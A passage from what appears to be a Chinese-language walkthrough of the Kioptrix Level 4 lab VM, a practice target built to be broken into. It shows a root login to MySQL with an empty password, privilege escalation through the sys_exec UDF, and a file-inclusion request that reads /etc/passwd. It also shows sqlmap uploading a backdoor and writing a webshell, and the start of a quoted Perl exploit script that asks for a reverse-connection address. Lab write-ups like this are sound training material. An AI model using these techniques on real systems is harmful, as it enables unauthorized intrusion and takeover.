?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld</span><br><span class="line">root      5120     1  0 04:45 ?        00:00:00 /usr/sbin/nmbd -D</span><br><span class="line">root      5122     1  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5136  5122  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5137     1  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5149  5137  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5169     1  0 04:45 ?        00:00:00 /usr/sbin/cron</span><br><span class="line">root      5191     1  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">root      5247     1  0 04:45 tty1     00:00:00 /sbin/getty 38400 tty1</span><br><span class="line">root      5277  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5280  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5880  4927  0 09:23 ?        00:00:00 sshd: john [priv]</span><br><span class="line">john      5928  5897  0 09:35 pts/0    00:00:00 grep root</span><br></pre></td></tr></table></figure>

<p>可以看到MySQL以root权限运行。 由于具有对计算机的ssh访问权限，因此可以通过访问配置文件来查看是否能找到数据库凭据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ ls</span><br><span class="line">checklogin.php  index.php          logout.php  tmpbbmjx.php  tmpbtzfy.php  tmpuijdt.php</span><br><span class="line">database.sql    john               member.php  tmpbdorc.php  tmpubjrn.php  tmpureio.php</span><br><span class="line">images          login_success.php  robert      tmpbstyp.php  tmpuepxr.php  tmpuyhae.php</span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ cat checklogin.php</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>; // Host name</span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>; // Mysql username</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;&quot;</span>; // Mysql password</span><br><span class="line"><span class="variable">$db_name</span>=<span class="string">&quot;members&quot;</span>; // Database name</span><br><span class="line"><span class="variable">$tbl_name</span>=<span class="string">&quot;members&quot;</span>; // Table name</span><br><span class="line"></span><br><span class="line">// Connect to server and select databse.</span><br><span class="line">mysql_connect(<span class="string">&quot;<span class="variable">$host</span>&quot;</span>, <span class="string">&quot;<span class="variable">$username</span>&quot;</span>, <span class="string">&quot;<span class="variable">$password</span>&quot;</span>)or die(<span class="string">&quot;cannot connect&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;<span class="variable">$db_name</span>&quot;</span>)or die(<span class="string">&quot;cannot select DB&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Define <span class="variable">$myusername</span> and <span class="variable">$mypassword</span></span><br><span class="line"><span class="variable">$myusername</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myusername&#x27;</span>];</span><br><span class="line"><span class="variable">$mypassword</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mypassword&#x27;</span>];</span><br><span class="line"></span><br><span class="line">// To protect MySQL injection (more detail about MySQL injection)</span><br><span class="line"><span class="variable">$myusername</span> = stripslashes(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = stripslashes(<span class="variable">$mypassword</span>);</span><br><span class="line"><span class="variable">$myusername</span> = mysql_real_escape_string(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = mysql_real_escape_string(<span class="variable">$mypassword</span>);</span><br><span class="line"></span><br><span class="line">//<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>);</span><br><span class="line">//<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">// Mysql_num_row is counting table row</span><br><span class="line"><span class="variable">$count</span>=mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">// If result matched <span class="variable">$myusername</span> and <span class="variable">$mypassword</span>, table row must be 1 row</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>!=0)&#123;</span><br><span class="line">// Register <span class="variable">$myusername</span>, <span class="variable">$mypassword</span> and redirect to file <span class="string">&quot;login_success.php&quot;</span></span><br><span class="line">        session_register(<span class="string">&quot;myusername&quot;</span>);</span><br><span class="line">        session_register(<span class="string">&quot;mypassword&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;location:login_success.php?username=<span class="variable">$myusername</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Wrong Username or Password&quot;</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不需要密码即可访问数据库。 由于我们MySQL的root访问权限，因此可以使用用户定义的函数执行命令（在操作系统本身上）。 因为可以以root用户身份访问MySQL服务器，所以我们将使用用户定义函数将特权升级为root用户。 为了执行这些命令，我们需要确保lib_mysqludf_sys.so在服务器上。 使用whereis命令，我发现它已经安装在服务器上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">john@192.168.84.139<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to LigGoat Security Systems - We are Watching</span></span><br><span class="line"><span class="string">== Welcome LigGoat Employee ==</span></span><br><span class="line"><span class="string">LigGoat Shell is in place so you  don&#x27;</span>t screw up</span><br><span class="line">Type <span class="string">&#x27;?&#x27;</span> or <span class="string">&#x27;help&#x27;</span> to get the list of allowed commands</span><br><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ ls</span><br><span class="line">john@Kioptrix4:~$ mysql -h localhost -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 6760</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">exit</span>;                                       </span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ sudo su</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># MyNameIsJohn</span></span><br><span class="line">bash: MyNameIsJohn: <span class="built_in">command</span> not found</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment">#</span></span><br><span class="line">root@Kioptrix4:~<span class="comment"># cat congrats.txt</span></span><br><span class="line">Congratulations!</span><br><span class="line">You<span class="string">&#x27;ve got root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">There is more then one way to get root on this system. Try and find them.</span></span><br><span class="line"><span class="string">I&#x27;</span>ve only tested two (2) methods, but it doesn<span class="string">&#x27;t mean there aren&#x27;</span>t more.</span><br><span class="line">As always there<span class="string">&#x27;s an easy way, and a not so easy way to pop this box.</span></span><br><span class="line"><span class="string">Look for other methods to get root privileges other than running an exploit.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It took a while to make this. For one it&#x27;</span>s not as easy as it may look, and</span><br><span class="line">also work and family life are my priorities. Hobbies are low on my list.</span><br><span class="line">Really hope you enjoyed this one.</span><br><span class="line"></span><br><span class="line">If you haven<span class="string">&#x27;t already, check out the other VMs available on:</span></span><br><span class="line"><span class="string">www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thanks for playing,</span></span><br><span class="line"><span class="string">loneferret</span></span><br></pre></td></tr></table></figure>

<p>使用sys_exec，可以运行将john添加到admin组的usermod，然后运行sudo su以获得root权限的shell,至此渗透靶机的目标已经完成。</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><p>由于受sock_sendpage（）NULL指针取消引用攻击，还能使用内核提权脚本进行提权，具体方法自行google，常规操作就不在此赘述.</p>
<ul>
<li>文件包含</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(请求包)</span><br><span class="line"></span><br><span class="line">GET /member.php?username=/etc/etc/passwd%00 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.84.139</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=b5a332dd49e1d5192ffb8915fa3e7f84</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">(响应包)</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line"></span><br><span class="line">Date: Tue, 10 Dec 2019 16:39:07 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line"></span><br><span class="line">X-Powered-By: PHP/5.2.4-2ubuntu5.6</span><br><span class="line"></span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"></span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">location: index.php</span><br><span class="line"></span><br><span class="line">Content-Length: 1146</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">klog:x:103:104::/home/klog:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">john:x:1001:1001:,,,:/home/john:/bin/kshell</span><br><span class="line">robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span><br></pre></td></tr></table></figure>

<ul>
<li>sqlmap的os-shell功能</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(判断是否具有dba权限)</span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:12:43] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetching current user</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] resumed: root@localhost</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[04:12:43] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:12:43 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(如果有，如下所示getshell)</span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                         </span></span><br><span class="line"><span class="string"> ___ ___[.]_____ ___ ___  &#123;1.3.11#stable&#125;                                                            </span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;</span>| . |                                                                            </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                            </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:10:50 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:10:50] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:10:50] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] heuristics detected web page charset &#x27;ascii&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:10:50] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved the web server document root: &#x27;/var/www&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] retrieved web server absolute paths: &#x27;/var/www/checklogin.php&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] trying to upload the file stager on &#x27;/var/www/&#x27; via LIMIT &#x27;LINES TERMINATED BY&#x27; method</span></span><br><span class="line"><span class="string">[04:10:51] [INFO] the file stager has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpuhuus.php</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] unable to upload the file through the web file stager to &#x27;/var/www/&#x27;</span></span><br><span class="line"><span class="string">[04:10:51] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] the backdoor has been successfully uploaded on &#x27;/var/www/&#x27; - http://192.168.84.139:80/tmpbhqem.php</span></span><br><span class="line"><span class="string">[04:10:53] [INFO] calling OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbbmjx.php</span></span><br><span class="line"><span class="string">tmpbdorc.php</span></span><br><span class="line"><span class="string">tmpbhqem.php</span></span><br><span class="line"><span class="string">tmpbstyp.php</span></span><br><span class="line"><span class="string">tmpbtzfy.php</span></span><br><span class="line"><span class="string">tmpubjrn.php</span></span><br><span class="line"><span class="string">tmpuepxr.php</span></span><br><span class="line"><span class="string">tmpuhuus.php</span></span><br><span class="line"><span class="string">tmpuijdt.php</span></span><br><span class="line"><span class="string">tmpureio.php</span></span><br><span class="line"><span class="string">tmpuyhae.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>sqlmap自带的文件上传payload</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub36.jpg"></p>
<p>如果传不了，直接用下列命令写马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --file-write /root/shells/php/bullfuck.php --file-dest /var/www/bullshit.php        ___</span></span><br><span class="line">       __H__                                                                                                                                                    </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                                                                                                         </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                                                                                                                 </span><br><span class="line">|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:42:12 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:42:12] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:42:12] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[04:42:12] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">[04:42:12] [WARNING] expect junk characters inside the file as a leftover from original query</span></span><br><span class="line"><span class="string">[04:42:14] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrievalDBMS file system (&#x27;</span>/var/www/bullshit.php<span class="string">&#x27;)? [Y/n] </span></span><br><span class="line"><span class="string">[04:42:14] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">[04:42:17] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)</span></span><br><span class="line"><span class="string">[04:42:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:42:17 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(成功写入)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:                                                                                                      </span></span><br><span class="line"><span class="string">---                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">checklogin.php                                                                                                                                                                             </span></span><br><span class="line"><span class="string">database.sql                                                                                                                                                                               </span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">bullshit.php</span></span><br><span class="line"><span class="string">checklogin.php</span></span><br><span class="line"><span class="string">database.sql</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">john</span></span><br><span class="line"><span class="string">login_success.php</span></span><br><span class="line"><span class="string">logout.php</span></span><br><span class="line"><span class="string">member.php</span></span><br><span class="line"><span class="string">robert</span></span><br><span class="line"><span class="string">tmpbokko.php</span></span><br><span class="line"><span class="string">tmpuvljz.php</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>下面再附上希腊某位大佬的傻瓜式通关脚本;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use LWP::UserAgent;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Coded by mr.pr0n - https://ghostinthelab.wordpress.com - (@_pr0n_)</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot; Kioptrix Level 4 - Run2Shell Script\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address of the Kioptrix box (e.g.: http://192.168.178.21)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$target</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$target</span> <span class="keyword">if</span> (<span class="variable">$target</span> !~ /^http:/);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span 